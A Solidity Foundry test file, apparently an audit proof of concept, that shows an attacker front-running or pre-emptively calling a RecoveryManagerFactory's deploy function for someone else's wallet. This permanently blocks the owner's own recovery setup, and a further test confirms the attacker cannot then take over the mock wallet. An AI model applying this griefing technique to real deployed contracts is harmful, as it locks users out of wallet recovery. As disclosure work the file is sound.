// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {Test} from "forge-std/Test.sol";
import {EIP712Lib} from "../../src/libraries/EIP712Lib.sol";
import {IVerifier} from "../../src/interfaces/IVerifier.sol";
import {RecoveryManager} from "../../src/RecoveryManager.sol";
import {GuardianLib} from "../../src/libraries/GuardianLib.sol";
import {IRecoveryManager} from "../../src/interfaces/IRecoveryManager.sol";
import {RecoveryManagerFactory} from "../../src/RecoveryManagerFactory.sol";

// ============ Mock Contracts ============

/// @dev Minimal mock verifier for POC tests
contract MockVerifier is IVerifier {
    function verify(bytes32, bytes32, bytes calldata) external pure override returns (bool) {
        return true;
    }

    function guardianType() external pure override returns (uint8) {
        return 1;
    }
}

/// @dev Mock wallet with strict authorization checks
contract MockWallet {
    address public owner;
    mapping(address => bool) private _authorized;

    constructor(address _owner) {
        owner = _owner;
    }

    function setOwner(address newOwner) external {
        require(_authorized[msg.sender], "not authorized");
        owner = newOwner;
    }

    function isRecoveryAuthorized(address account) external view returns (bool) {
        return _authorized[account];
    }

    function authorize(address account) external {
        require(msg.sender == owner, "only owner");
        _authorized[account] = true;
    }
}

// ============ POC: Front-Run deployRecoveryManager — Permanent DOS ============

contract FrontRunDeployRecoveryManager is Test {
    RecoveryManager implementation;
    RecoveryManagerFactory factory;
    MockVerifier passkeyVerifier;
    MockVerifier zkJwtVerifier;
    MockWallet wallet;

    address walletOwner = address(0x1111);
    address attacker = address(0xBAD);

    // Legitimate guardian keys
    uint256 guardian1Key = 0xA11CE;
    address guardian1Addr;
    bytes32 guardian1Id;

    uint256 guardian2Key = 0xB0B;
    address guardian2Addr;
    bytes32 guardian2Id;

    // Attacker guardian keys
    uint256 attackerGuardian1Key = 0xDEAD1;
    address attackerGuardian1Addr;
    bytes32 attackerGuardian1Id;

    uint256 attackerGuardian2Key = 0xDEAD2;
    address attackerGuardian2Addr;
    bytes32 attackerGuardian2Id;

    function setUp() public {
        // Derive legitimate guardian addresses
        guardian1Addr = vm.addr(guardian1Key);
        guardian1Id = GuardianLib.computeEoaIdentifier(guardian1Addr);

        guardian2Addr = vm.addr(guardian2Key);
        guardian2Id = GuardianLib.computeEoaIdentifier(guardian2Addr);

        // Derive attacker guardian addresses
        attackerGuardian1Addr = vm.addr(attackerGuardian1Key);
        attackerGuardian1Id = GuardianLib.computeEoaIdentifier(attackerGuardian1Addr);

        attackerGuardian2Addr = vm.addr(attackerGuardian2Key);
        attackerGuardian2Id = GuardianLib.computeEoaIdentifier(attackerGuardian2Addr);

        // Deploy infrastructure
        implementation = new RecoveryManager();
        passkeyVerifier = new MockVerifier();
        zkJwtVerifier = new MockVerifier();
        factory = new RecoveryManagerFactory(
            address(implementation),
            address(passkeyVerifier),
            address(zkJwtVerifier)
        );
        wallet = new MockWallet(walletOwner);
    }

    // ============ Helpers ============

    function _createLegitimateGuardians() internal view returns (GuardianLib.Guardian[] memory) {
        GuardianLib.Guardian[] memory guardians = new GuardianLib.Guardian[](2);
        guardians[0] = GuardianLib.Guardian(GuardianLib.GuardianType.EOA, guardian1Id);
        guardians[1] = GuardianLib.Guardian(GuardianLib.GuardianType.EOA, guardian2Id);
        return guardians;
    }

    function _createAttackerGuardians() internal view returns (GuardianLib.Guardian[] memory) {
        GuardianLib.Guardian[] memory guardians = new GuardianLib.Guardian[](2);
        guardians[0] = GuardianLib.Guardian(GuardianLib.GuardianType.EOA, attackerGuardian1Id);
        guardians[1] = GuardianLib.Guardian(GuardianLib.GuardianType.EOA, attackerGuardian2Id);
        return guardians;
    }

    function _signIntent(uint256 privateKey, bytes32 intentHash) internal pure returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, intentHash);
        return abi.encode(v, r, s);
    }

    // ============ POC Tests ============

    function test_POC_attackerFrontRunsPoisonsMapping() public {
        GuardianLib.Guardian[] memory attackerGuardians = _createAttackerGuardians();
        GuardianLib.Guardian[] memory legitimateGuardians = _createLegitimateGuardians();

        // ---- Step 1: Attacker front-runs with malicious guardians ----
        vm.prank(attacker);
        address attackerProxy = factory.deployRecoveryManager(
            address(wallet),
            attackerGuardians,
            1, // low threshold for easy exploitation
            0  // zero challenge period
        );

        // Attacker's proxy is now registered
        assertEq(factory.getRecoveryManager(address(wallet)), attackerProxy);

        // ---- Step 2: Victim's legitimate tx reverts with AlreadyDeployed ----
        vm.prank(walletOwner);
        vm.expectRevert(RecoveryManagerFactory.AlreadyDeployed.selector);
        factory.deployRecoveryManager(
            address(wallet),
            legitimateGuardians,
            2,
            1 days
        );

        // ---- Step 3: Mapping is permanently poisoned ----
        // Victim tries again — still reverts
        vm.prank(walletOwner);
        vm.expectRevert(RecoveryManagerFactory.AlreadyDeployed.selector);
        factory.deployRecoveryManager(
            address(wallet),
            legitimateGuardians,
            2,
            1 days
        );

        // The mapping still points to attacker's proxy
        assertEq(factory.getRecoveryManager(address(wallet)), attackerProxy);
    }

    /// @notice Proves the attacker does NOT need to monitor the mempool —
    ///         they can proactively poison any wallet address before the
    ///         wallet owner even attempts to deploy.
    function test_POC_attackerPreEmptivelyPoisonsWallet() public {
        GuardianLib.Guardian[] memory attackerGuardians = _createAttackerGuardians();

        // Attacker poisons the wallet address before the victim ever tries
        vm.prank(attacker);
        factory.deployRecoveryManager(
            address(wallet),
            attackerGuardians,
            1,
            0
        );

        // Later, the victim tries to deploy — permanently blocked
        GuardianLib.Guardian[] memory legitimateGuardians = _createLegitimateGuardians();

        vm.prank(walletOwner);
        vm.expectRevert(RecoveryManagerFactory.AlreadyDeployed.selector);
        factory.deployRecoveryManager(
            address(wallet),
            legitimateGuardians,
            2,
            1 days
        );
    }

    function test_POC_attackerCannotTakeOverWallet() public {
        GuardianLib.Guardian[] memory attackerGuardians = _createAttackerGuardians();

        // Attacker deploys proxy with their guardians
        vm.prank(attacker);
        address attackerProxy = factory.deployRecoveryManager(
            address(wallet),
            attackerGuardians,
            1,
            0
        );

        RecoveryManager rm = RecoveryManager(attackerProxy);

        // Attacker starts recovery with their guardian
        address attackerNewOwner = address(0xEEEE);
        EIP712Lib.RecoveryIntent memory intent = EIP712Lib.RecoveryIntent({
            wallet: address(wallet),
            newOwner: attackerNewOwner,
            nonce: 0,
            deadline: block.timestamp + 7 days,
            chainId: block.chainid,
            recoveryManager: attackerProxy
        });
        bytes32 intentHash = EIP712Lib.hashTypedData(intent, attackerProxy);
        bytes memory proof = _signIntent(attackerGuardian1Key, intentHash);

        rm.startRecovery(intent, 0, proof);

        vm.expectRevert("not authorized");
        rm.executeRecovery();

        assertEq(wallet.owner(), walletOwner);
    }
}
